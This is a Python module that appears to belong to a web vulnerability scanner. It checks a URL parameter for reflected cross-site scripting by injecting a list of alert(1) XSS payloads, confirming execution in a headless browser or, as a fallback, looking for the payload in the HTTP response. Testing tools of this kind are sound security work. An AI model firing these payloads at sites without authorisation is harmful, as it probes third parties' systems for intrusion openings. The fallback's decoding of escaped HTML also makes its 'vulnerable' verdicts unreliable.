import re, requests, time, sys
from typing import Optional, Dict
from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("xss_browser_verify")

HAS_PLAYWRIGHT = False
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    pass


def _build_url(base: str, param: str, value: str) -> str:
    import urllib.parse
    parsed = urllib.parse.urlparse(base)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.ParseResult(
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_qs, parsed.fragment
    ).geturl()


CONFIRM_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "\"-alert(1)-\"",
    "';-alert(1)-'",
]


def _verify_playwright(url: str, param: str, timeout: float) -> Dict:
    result = {"vulnerable": False, "confirmed": False, "evidence": []}

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                ignore_https_errors=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            )
            page = context.new_page()
            dialog_caught = [False]
            dialog_text = [""]

            def on_dialog(dialog):
                dialog_caught[0] = True
                dialog_text[0] = dialog.message[:200]
                dialog.accept()

            page.on("dialog", on_dialog)

            for payload in CONFIRM_PAYLOADS:
                dialog_caught[0] = False
                dialog_text[0] = ""
                try:
                    page.goto(_build_url(url, param, payload),
                              wait_until="domcontentloaded",
                              timeout=int(timeout * 1000))
                    time.sleep(0.3)
                    if dialog_caught[0]:
                        result["vulnerable"] = True
                        result["confirmed"] = True
                        result["evidence"].append(
                            f"Playwright confirmed: alert({dialog_text[0]}) via {payload[:30]}")
                        break
                except Exception as e:
                    logger.debug("playwright payload %s: %s", payload[:20], e)

            browser.close()
    except Exception as e:
        logger.debug("playwright init: %s", e)
        result["error"] = str(e)[:80]

    return result


def _verify_http(url: str, param: str, sess: "requests.Session",
                 timeout: float) -> Dict:
    result = {"vulnerable": False, "confirmed": False,
              "evidence": [], "note": "HTTP fallback (no Playwright)"}

    for payload in CONFIRM_PAYLOADS:
        try:
            r = sess.get(_build_url(url, param, payload),
                         timeout=timeout)
            if payload in r.text.replace("&lt;", "<").replace("&gt;", ">"):
                result["vulnerable"] = True
                result["evidence"].append(f"payload reflected: {payload[:25]}")
                break
        except Exception as e:
            logger.debug("http verify %s: %s", payload[:20], e)

    return result


def check(url: str, param: str, sess: Optional["requests.Session"] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl

    logger.info("XSS browser verify: %s?%s (playwright=%s)", url, param, HAS_PLAYWRIGHT)

    if HAS_PLAYWRIGHT:
        r = _verify_playwright(url, param, timeout)
    else:
        r = _verify_http(url, param, sess, timeout)

    r["playwright_available"] = HAS_PLAYWRIGHT
    if not r.get("vulnerable"):
        r["note"] = "No XSS execution confirmed"

    return r
